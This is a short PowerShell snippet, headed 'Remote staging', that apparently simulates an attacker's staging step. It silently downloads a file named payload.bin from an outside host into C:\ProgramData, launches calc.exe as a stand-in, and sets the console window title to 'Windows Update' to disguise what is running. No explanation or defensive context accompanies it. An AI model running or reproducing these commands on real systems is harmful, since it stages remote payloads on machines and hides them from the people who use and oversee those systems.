
# Remote staging
curl.exe -s -L -o 'C:\ProgramData\payload.bin' "http://adatum.com/downloads/payload.bin"
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
$Host.UI.RawUI.WindowTitle = "Windows Update"
